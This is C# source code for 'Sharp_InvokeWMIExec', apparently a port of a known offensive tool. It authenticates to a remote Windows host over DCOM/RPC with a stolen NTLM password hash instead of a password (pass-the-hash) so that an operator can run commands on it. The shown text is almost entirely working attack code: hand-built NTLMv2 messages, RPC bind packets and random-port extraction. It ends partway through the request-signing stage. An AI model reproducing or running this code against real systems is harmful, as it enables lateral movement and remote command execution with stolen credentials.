using System;
using System.Net;
using Mono.Options;
using System.Threading;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Collections;

namespace Sharp_InvokeWMIExec
{
    class Program
    {
        static void Main(string[] args)
        {
            //User Params
            string command = "";
            string hash = "";
            string username = "";
            string output_username = "";
            bool debugging = false;
            string domain = "";
            string target = "";
            string processID = "";
            string target_short = "";
            int sleep = 5;
			bool show_help = false;

			//Tracking Params
			int request_length = 0;
            bool  WMI_execute = false;
            int sequence_number_counter = 0;
            int request_split_index_tracker = 0;
            byte[] WMI_client_send;
            string WMI_random_port_string = null;
            string target_long = "";
            int WMI_random_port_int = 0;
            IPAddress target_type = null;
            byte[] object_UUID = null;
            byte[] IPID = null;
            string WMI_client_stage = "";
            string WMI_data = "";
            string OXID = "";
            int OXID_index = 0;
            int OXID_bytes_index = 0;
            byte[] object_UUID2 = null;
            byte[] sequence_number = null;
            byte[] request_flags = null;
            int request_auth_padding = 0;
            byte[] request_call_ID = null;
            byte[] request_opnum = null;
            byte[] request_UUID = null;
            byte[] request_context_ID = null;
            byte[] alter_context_call_ID = null;
            byte[] alter_context_context_ID = null;
            byte[] alter_context_UUID = null;
            byte[] hostname_length = null;
            byte[] stub_data = null;
            byte[] WMI_namespace_length = null;
            byte[] WMI_namespace_unicode = null;
            byte[] IPID2 = null;
            int request_split_stage = 0;


			OptionSet options = new OptionSet()
			.Add("?:|help:", "Prints out the options.", h => show_help = true)
			.Add("t=|target=", "Hostname or IP address of the target.", t => target = t)
			.Add("u=|username=", "Username to use for authentication.", u => username = u)
			.Add("d=|domain=", "Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username.", d => domain = d)
			.Add("h=|hash=", "NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.", h => hash = h)
			.Add("c=|command=", "Command to execute on the target. If a command is not specified, the function will check to see if the username and hash provides local admin access on the target.", option => command = option)
			.Add("sleep=", "Time in seconds to sleep. Change this value if you're getting weird results.", option => sleep = int.Parse(option))
			.Add("debug:", "Switch, enable debugging", option => debugging = true);
			options.Parse(args);


			if (show_help)
			{
				displayHelp();
				return;
			}

			if (!string.IsNullOrEmpty(command))
            {
                WMI_execute = true;
            }

            if (!string.IsNullOrEmpty(hash) && !string.IsNullOrEmpty(username))
            {
                if (debugging == true) { Console.WriteLine("Checking Hash Value \nCurrent Hash: {0}", hash); }
                if (hash.Contains(":"))
                {
                    hash = hash.Split(':').Last();
                }
            }
            else
            {
                if (string.IsNullOrEmpty(hash))
                {
                    Console.WriteLine("Missing required Option: hash");
                }
                else
                {
                    Console.WriteLine("Missing required Option: username");
                }
                displayHelp();
                Console.ReadKey();
                return;
            }


            //Check to see if domain is empty, if it's not update the username, if it is just keep the username
            if (!string.IsNullOrEmpty(domain))
            {
                output_username = domain + '\\' + username;
            }
            else
            {
                output_username = username;
            }
            if(target == "localhost")
            {
                target = "127.0.0.1";
                target_long = "127.0.0.1";
            }
            try
            {
                target_type = IPAddress.Parse(target);
                target_short = target_long = target;
            }
            catch
            {
                target_long = target;

                if (target.Contains("."))
                {
                    int target_short_index = target.IndexOf(".");
                    target_short = target.Substring(0, target_short_index);
                }
                else
                {
                    target_short = target;
                }
            }

            processID = Process.GetCurrentProcess().Id.ToString();
            byte[] process_ID_Bytes = BitConverter.GetBytes(int.Parse(processID));
            processID = BitConverter.ToString(process_ID_Bytes);
            processID = processID.Replace("-00-00", "").Replace("-", "");
            process_ID_Bytes = StringToByteArray(processID);
            Console.WriteLine("Connecting to {0}:135", target);
            TcpClient WMI_client_init = new TcpClient();
            WMI_client_init.Client.ReceiveTimeout = 30000;


            try
            {
                WMI_client_init.Connect(target, 135);
            }
            catch
            {
                Console.WriteLine("{0} didn't respond.",target);
            }

            if (WMI_client_init.Connected)
            {
                NetworkStream WMI_client_stream_init = WMI_client_init.GetStream();
                byte[] WMI_client_receive = new byte[2048];
                byte[] RPC_UUID = new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a };
                OrderedDictionary packet_RPC = GetPacketRPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x02 }, new byte[] { 0x00, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
                packet_RPC["RPCBind_FragLength"] = new byte[] { 0x74, 0x00 };
                byte[] RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                WMI_client_send = RPC;
                WMI_client_stream_init.Write(WMI_client_send, 0, WMI_client_send.Length);
                WMI_client_stream_init.Flush();
                WMI_client_stream_init.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                byte[] assoc_group = getByteRange(WMI_client_receive, 20, 23);
                packet_RPC = GetPacketRPCRequest(new byte[] { 0x03 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x05, 0x00 }, null);
                RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                WMI_client_send = RPC;
                WMI_client_stream_init.Write(WMI_client_send, 0, WMI_client_send.Length);
                WMI_client_stream_init.Flush();
                WMI_client_stream_init.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                byte[] WMI_hostname_unicode = getByteRange(WMI_client_receive, 42, WMI_client_receive.Length);
                string WMI_hostname = BitConverter.ToString(WMI_hostname_unicode);
                int WMI_hostname_index = WMI_hostname.IndexOf("-00-00-00");
                WMI_hostname = WMI_hostname.Substring(0, WMI_hostname_index).Replace("-00","");
                //Need to figure out what's done with the WMI_hostname here.
                byte[] WMI_hostname_bytes = StringToByteArray(WMI_hostname.Replace("-","").Replace(" ",""));
                WMI_hostname_bytes = getByteRange(WMI_hostname_bytes, 0, WMI_hostname_bytes.Length);
                WMI_hostname = Encoding.ASCII.GetString(WMI_hostname_bytes);

                if(target_short != WMI_hostname)
                {
                    Console.WriteLine("WMI reports target hostname as {0}", WMI_hostname);
                    target_short = WMI_hostname;
                }
                WMI_client_init.Close();
                WMI_client_stream_init.Close();
                TcpClient WMI_client = new TcpClient();
                WMI_client.Client.ReceiveTimeout = 30000;
                NetworkStream WMI_client_stream = null;

                try
                {
                    WMI_client.Connect(target_long, 135);
                    Console.WriteLine("Connected to {0}", target_long);
                }
                catch
                {
                    Console.WriteLine("{0} did not respond", target_long);
                }


                if (WMI_client.Connected)
                {
                    Console.WriteLine("WMI_client is connected");
                    WMI_client_stream = WMI_client.GetStream();
                    RPC_UUID = new byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
                    packet_RPC = GetPacketRPCBind(3, new byte[] { 0xd0, 0x16 }, new byte[] { 0x01 }, new byte[] { 0x01, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
                    packet_RPC["RPCBind_FragLength"] = new byte[] { 0x78, 0x00 };
                    packet_RPC["RPCBind_AuthLength"] = new byte[] { 0x28, 0x00 };
                    packet_RPC["RPCBind_NegotiateFlags"] = new byte[] { 0x07, 0x82, 0x08, 0xa2 };
                    RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                    WMI_client_send = RPC;
                    WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                    WMI_client_stream.Flush();
                    WMI_client_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                    assoc_group = getByteRange(WMI_client_receive, 20, 23);
                    string WMI_NTLMSSP = BitConverter.ToString(WMI_client_receive);
                    WMI_NTLMSSP = WMI_NTLMSSP.Replace("-", "");
                    int WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf("4E544C4D53535000");
                    int WMI_NTLMSSP_bytes_index = WMI_NTLMSSP_index / 2;
                    int WMI_domain_length = DataLength2(WMI_NTLMSSP_bytes_index + 12, WMI_client_receive);
                    int WMI_target_length = DataLength2(WMI_NTLMSSP_bytes_index + 40, WMI_client_receive);
                    byte[] WMI_session_ID = getByteRange(WMI_client_receive, 44, 51);
                    byte[] WMI_NTLM_challenge = getByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 24, WMI_NTLMSSP_bytes_index + 31);
                    byte[] WMI_target_details = getByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 56 + WMI_domain_length, WMI_NTLMSSP_bytes_index + 55 + WMI_domain_length + WMI_target_length);
                    byte[] WMI_target_time_bytes = getByteRange(WMI_target_details, WMI_target_details.Length - 12, WMI_target_details.Length - 5);
                    string hash2 = "";
                    for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                    byte[] NTLM_hash_bytes = (StringToByteArray(hash.Replace("-", "")));
                    string[] hash_string_array = hash2.Split('-');
                    string auth_hostname = Environment.MachineName;
                    byte[] auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                    byte[] auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                    byte[] auth_username_bytes = Encoding.Unicode.GetBytes(username);
                    byte[] auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                    auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                    byte[] auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                    auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                    byte[] auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                    auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                    byte[] auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                    byte[] auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                    byte[] auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                    byte[] auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                    byte[] auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                    HMACMD5 HMAC_MD5 = new HMACMD5();
                    HMAC_MD5.Key = NTLM_hash_bytes;
                    string username_and_target = username.ToUpper();
                    byte[] username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                    byte[] username_and_target_bytes = null;
                    username_and_target_bytes = CombineByteArray(username_bytes, auth_domain_bytes);
                    byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                    Random r = new Random();
                    byte[] client_challenge_bytes = new byte[8];
                    r.NextBytes(client_challenge_bytes);
                    byte[] security_blob_bytes = null;
                    security_blob_bytes = CombineByteArray(new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, WMI_target_time_bytes);
                    security_blob_bytes = CombineByteArray(security_blob_bytes, client_challenge_bytes);
                    security_blob_bytes = CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                    security_blob_bytes = CombineByteArray(security_blob_bytes, WMI_target_details);
                    security_blob_bytes = CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                    byte[] server_challenge_and_security_blob_bytes = CombineByteArray(WMI_NTLM_challenge, security_blob_bytes);
                    HMAC_MD5.Key = NTLMv2_hash;
                    byte[] NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                    byte[] session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                    NTLMv2_response = CombineByteArray(NTLMv2_response, security_blob_bytes);
                    byte[] NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                    NTLMv2_response_length = new byte[] { NTLMv2_response_length[0], NTLMv2_response_length[1] };
                    byte[] WMI_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);
                    byte[] WMI_session_key_length = new byte[] { 0x00, 0x00 };
                    byte[] WMI_negotiate_flags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };
                    byte[] NTLMSSP_response = null;
                    NTLMSSP_response = CombineByteArray(new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 }, auth_LM_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_NTLM_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_negotiate_flags);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_bytes);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_bytes);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_bytes);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response);
                    assoc_group = getByteRange(WMI_client_receive, 20, 23);
                    packet_RPC = GetPacketRPCAuth3(NTLMSSP_response);
                    RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                    WMI_client_send = RPC;
                    WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                    WMI_client_stream.Flush();
                    byte[] causality_ID_bytes = new byte[16];
                    r.NextBytes(causality_ID_bytes);
                    OrderedDictionary packet_DCOM_remote_create_instance = GetPacketDCOMRemoteCreateInstance(causality_ID_bytes, target_short);
                    byte[] DCOM_remote_create_instance = ConvertFromPacketOrderedDictionary(packet_DCOM_remote_create_instance);
                    packet_RPC = GetPacketRPCRequest(new byte[] { 0x03 }, DCOM_remote_create_instance.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x01, 0x00 }, new byte[] { 0x04, 0x00 }, null);
                    RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                    WMI_client_send = CombineByteArray(RPC , DCOM_remote_create_instance);
                    WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                    WMI_client_stream.Flush();
                    WMI_client_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);


                    Console.WriteLine("Switching to randomized port");
                    TcpClient WMI_client_random_port = new TcpClient();
                    WMI_client_random_port.Client.ReceiveTimeout = 30000;

                    if (WMI_client_receive[2] == 3 && BitConverter.ToString(getByteRange(WMI_client_receive, 24, 27)) == "05-00-00-00")
                    {
                        Console.WriteLine("{0} WMI access denied on {1}", output_username, target_long);
                    }
                    else if(WMI_client_receive[2] == 3)
                    {
                        string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                        string[] error_code_array = error_code.Split('-');
                        error_code = string.Join("", error_code_array);
                        Console.WriteLine("Error Code: 0x{0}", error_code.ToString());

                    }
                    else if(WMI_client_receive[2] == 2 && !WMI_execute)
                    {
                        Console.WriteLine("{0} accessed WMI on {1}", output_username, target_long);
                    }
                    else if(WMI_client_receive[2]==2 && WMI_execute)
                    {

                        Console.WriteLine("{0} accessed WMI on {1}", output_username, target_long);
                        if(target_short == "127.0.0.1")
                        {
                            target_short = auth_hostname;
                        }
                        byte[] target_unicode = CombineByteArray(new byte[] { 0x07, 0x00 }, Encoding.Unicode.GetBytes(target_short + "["));
                        string target_search = BitConverter.ToString(target_unicode).Replace("-","");
                        string WMI_message = BitConverter.ToString(WMI_client_receive).Replace("-","");
                        int target_index = WMI_message.IndexOf(target_search);

                        if (target_index < 1)
                        {
                            IPAddress[] target_address_list = Dns.GetHostEntry(target_long).AddressList;
                            foreach(IPAddress ip in target_address_list){
                                target_short = ip.Address.ToString();
                                Console.WriteLine(target_short);
                                target_unicode = CombineByteArray(new byte[] { 0x07, 0x00 }, Encoding.Unicode.GetBytes(target_short + "["));
                                target_search = BitConverter.ToString(target_unicode).Replace("-", "");
                                target_index = WMI_message.IndexOf(target_search);

                                if(target_index >= 0)
                                {
                                    break;
                                }
                            }
                        }

                        if(target_long != target_short) //Need to check if the -cne flag is the same as this?
                        {
                            Console.WriteLine("Using {0} for random port extraction", target_short);
                        }
                        
                        if(target_index > 0)
                        {
                            int target_bytes_index = target_index / 2;
                            byte[] WMI_random_port_bytes = getByteRange(WMI_client_receive,target_bytes_index + target_unicode.Length, target_bytes_index + target_unicode.Length + 8);
                            WMI_random_port_string = BitConverter.ToString(WMI_random_port_bytes);
                            int WMI_random_port_end_index = WMI_random_port_string.IndexOf("-5D");

                            if(WMI_random_port_end_index > 0)
                            {
                                WMI_random_port_string = WMI_random_port_string.Substring(0, WMI_random_port_end_index);
                            }
                            WMI_random_port_string = WMI_random_port_string.Replace("-00", "").Replace("-", "");
                            char[] random_port_char_array = WMI_random_port_string.ToCharArray();
                            char[] chars = new char[] { random_port_char_array[1], random_port_char_array[3], random_port_char_array[5], random_port_char_array[7], random_port_char_array[9] };
                            WMI_random_port_int = int.Parse(new string(chars));
                            //Takes the last number of each byte.
                            string meow = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                            int meow_index = meow.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820");
                            int meow_bytes_index = meow_index / 2;
                            Console.WriteLine("meow_index: {0}\nmeow_bytes_index: {1}", meow_index, meow_bytes_index);
                            byte[] OXID_bytes = getByteRange(WMI_client_receive, meow_bytes_index + 32, meow_bytes_index + 39);
                            IPID = getByteRange(WMI_client_receive, meow_bytes_index + 48, meow_bytes_index + 63);
                            OXID = BitConverter.ToString(OXID_bytes).Replace("-","");
                            OXID_index = meow.IndexOf(OXID, meow_index + 100);
                            OXID_bytes_index = OXID_index / 2;
                            object_UUID = getByteRange(WMI_client_receive, OXID_bytes_index + 12, OXID_bytes_index + 27);
                        }
                        if (WMI_random_port_int != 0)
                        {
                            Console.WriteLine("Connecting to {0}:{1}", target_long, WMI_random_port_int);

                            try
                            {
                                WMI_client_random_port.Connect(target_long, WMI_random_port_int);
                            }
                            catch
                            {
                                Console.WriteLine("{0}:{1} did not response", target_long, WMI_random_port_int);
                            }
                        }
                        else
                        {
                            Console.WriteLine("Random port extraction failure");
                        }

                    }
                    else
                    {
                        Console.WriteLine("Something went wrong");
                    }

                    if (WMI_client_random_port.Connected)
                    {
                        NetworkStream WMI_client_random_port_stream = WMI_client_random_port.GetStream();
                        packet_RPC = GetPacketRPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x03 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}, new byte[] { 0x00, 0x00 });
                        packet_RPC["RPCBind_FragLength"] = new byte[] { 0xd0, 0x00 };
                        packet_RPC["RPCBind_AuthLength"] = new byte[] { 0x28, 0x00 };
                        packet_RPC["RPCBind_NegotiateFlags"] = new byte[] { 0x97, 0x82, 0x08, 0xa2 };
                        RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                        WMI_client_send = RPC;
                        WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                        WMI_client_random_port_stream.Flush();
                        WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                        assoc_group = getByteRange(WMI_client_receive, 20, 23);
                        WMI_NTLMSSP = BitConverter.ToString(WMI_client_receive);
                        WMI_NTLMSSP = WMI_NTLMSSP.Replace("-", "");
                        WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf("4E544C4D53535000");
                        WMI_NTLMSSP_bytes_index = WMI_NTLMSSP_index / 2;
                        WMI_domain_length = DataLength2(WMI_NTLMSSP_bytes_index + 12, WMI_client_receive);
                        WMI_target_length = DataLength2(WMI_NTLMSSP_bytes_index + 40, WMI_client_receive);
                        WMI_session_ID = getByteRange(WMI_client_receive, 44, 51);
                        WMI_NTLM_challenge = getByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 24, WMI_NTLMSSP_bytes_index + 31);
                        WMI_target_details = getByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 56 + WMI_domain_length, WMI_NTLMSSP_bytes_index + 55 + WMI_domain_length + WMI_target_length);
                        WMI_target_time_bytes = getByteRange(WMI_target_details, WMI_target_details.Length - 12, WMI_target_details.Length - 5);
                        hash2 = "";
                        for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                        NTLM_hash_bytes = (StringToByteArray(hash.Replace("-", "")));
                        hash_string_array = hash2.Split('-');
                        auth_hostname = Environment.MachineName;
                        auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                        auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                        auth_username_bytes = Encoding.Unicode.GetBytes(username);
                        auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                        auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                        auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                        auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                        auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                        auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                        auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                        auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                        auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                        auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                        auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                        HMAC_MD5 = new HMACMD5();
                        HMAC_MD5.Key = NTLM_hash_bytes;
                        username_and_target = username.ToUpper();
                        username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                        username_and_target_bytes = null;
                        username_and_target_bytes = CombineByteArray(username_bytes, auth_domain_bytes);
                        NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                        r = new Random();
                        client_challenge_bytes = new byte[8];
                        r.NextBytes(client_challenge_bytes);
                        security_blob_bytes = null;
                        security_blob_bytes = CombineByteArray(new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, WMI_target_time_bytes);
                        security_blob_bytes = CombineByteArray(security_blob_bytes, client_challenge_bytes);
                        security_blob_bytes = CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                        security_blob_bytes = CombineByteArray(security_blob_bytes, WMI_target_details);
                        security_blob_bytes = CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                        server_challenge_and_security_blob_bytes = CombineByteArray(WMI_NTLM_challenge, security_blob_bytes);
                        HMAC_MD5.Key = NTLMv2_hash;
                        NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                        session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                        byte[] client_signing_constant = new byte[] {0x73,0x65,0x73,0x73,0x69,0x6f,0x6e,0x20,0x6b,0x65,0x79,0x20,0x74,0x6f,0x20,0x63,0x6c,0x69,0x65,0x6e,0x74,0x2d,0x74,0x6f,0x2d,0x73,0x65,0x72,0x76, 0x65,0x72,0x20,0x73,0x69,0x67,0x6e,0x69,0x6e,0x67,0x20,0x6b,0x65,0x79,0x20,0x6d,0x61,0x67,0x69,0x63,0x20,0x63,0x6f,0x6e,0x73,0x74,0x61,0x6e,0x74,0x00};
                        MD5CryptoServiceProvider MD5_crypto = new MD5CryptoServiceProvider();
                        byte[] client_signing_key = MD5_crypto.ComputeHash(CombineByteArray(session_base_key, client_signing_constant));
                        NTLMv2_response = CombineByteArray(NTLMv2_response, security_blob_bytes);
                        NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                        NTLMv2_response_length = new byte[] { NTLMv2_response_length[0], NTLMv2_response_length[1] };
                        WMI_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);
                        WMI_session_key_length = new byte[] { 0x00, 0x00 };
                        WMI_negotiate_flags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };
                        NTLMSSP_response = null;
                        NTLMSSP_response = CombineByteArray(new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 }, auth_LM_offset);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_NTLM_offset);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_offset);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_offset);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_offset);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_length);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_offset);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_negotiate_flags);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_bytes);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_bytes);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_bytes);
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                        NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response);
                        HMAC_MD5.Key = client_signing_key;
                        sequence_number = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                        packet_RPC = GetPacketRPCAuth3(NTLMSSP_response);
                        packet_RPC["RPCAUTH3_CallID"] = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                        packet_RPC["RPCAUTH3_AuthLevel"] = new byte[] { 0x04 };
                        RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                        WMI_client_send = RPC;
                        WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                        WMI_client_random_port_stream.Flush();
                        packet_RPC = GetPacketRPCRequest(new byte[] { 0x83 }, 76, 16, 4, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x03, 0x00 }, object_UUID);
                        OrderedDictionary packet_rem_query_interface = GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID, new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 });
                        OrderedDictionary packet_NTLMSSP_verifier = GetPacketNTLMSSPVerifier(4, new byte[] { 0x04 }, sequence_number);
                        RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                        byte[] rem_query_interface = ConvertFromPacketOrderedDictionary(packet_rem_query_interface);
                        byte[] NTLMSSP_verifier = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                        HMAC_MD5.Key = client_signing_key;
                        byte[] RPC_Sign = CombineByteArray(sequence_number, RPC);
                        RPC_Sign = CombineByteArray(RPC_Sign, rem_query_interface);
